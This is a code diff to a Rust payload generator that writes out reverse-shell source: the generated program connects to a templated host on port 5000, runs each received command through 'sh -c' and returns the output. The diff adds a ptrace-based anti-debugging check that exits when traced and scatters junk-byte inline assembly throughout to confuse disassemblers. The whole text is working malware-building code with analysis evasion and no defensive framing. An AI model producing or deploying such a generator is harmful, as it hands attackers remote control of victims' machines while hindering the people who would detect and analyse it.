@@ -25,31 +25,72 @@ pub fn generate() {
         source = format!("use std::io::{{Read, Write}};
 use std::net::TcpStream;
 use std::process::Command;
+use std::process;
+
+fn overwatch() -> bool {{
+    unsafe {{
+        std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+    }}
+    let result: isize;
+    unsafe {{
+        std::arch::asm!(
+            \"syscall\",
+            in(\"rax\") 101,
+            in(\"rdi\") 0,
+            in(\"rsi\") 0,
+            in(\"rdx\") 0,
+            in(\"r10\") 0,
+            lateout(\"rax\") result,
+            options(nostack)
+        );
+    }}
+    if result == -1 {{
+        unsafe {{
+            std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+        }}
+        true
+    }} else {{
+        unsafe {{
+            std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+        }}
+        false
+    }}
+}}
 
 pub fn main() {{
     unsafe {{
         std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
     }}
-    if let Ok(mut stream) = TcpStream::connect(\"{}:5000\") {{
+    if overwatch() {{
         unsafe {{
             std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
         }}
-        loop {{
+        process::exit(1);
+    }} else {{
+        unsafe {{
+            std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+        }}
+        if let Ok(mut stream) = TcpStream::connect(\"{}:5000\") {{
             unsafe {{
                 std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
             }}
-            let mut buffer = [0; 1024];
-            if let Ok(n) = stream.read(&mut buffer) {{
+            loop {{
                 unsafe {{
                     std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
                 }}
-                let cmd = String::from_utf8_lossy(&buffer[..n]);
-                let output = Command::new(\"sh\")
-                    .arg(\"-c\")
-                    .arg(cmd.trim())
-                    .output()
-                    .unwrap();
-                stream.write_all(&output.stdout).unwrap();
+                let mut buffer = [0; 1024];
+                if let Ok(n) = stream.read(&mut buffer) {{
+                    unsafe {{
+                        std::arch::asm!(\".byte 0x74, 0x03, 0x75, 0x01, 0xe8\");
+                    }}
+                    let cmd = String::from_utf8_lossy(&buffer[..n]);
+                    let output = Command::new(\"sh\")
+                        .arg(\"-c\")
+                        .arg(cmd.trim())
+                        .output()
+                        .unwrap();
+                    stream.write_all(&output.stdout).unwrap();
+                }}
             }}
         }}
     }}
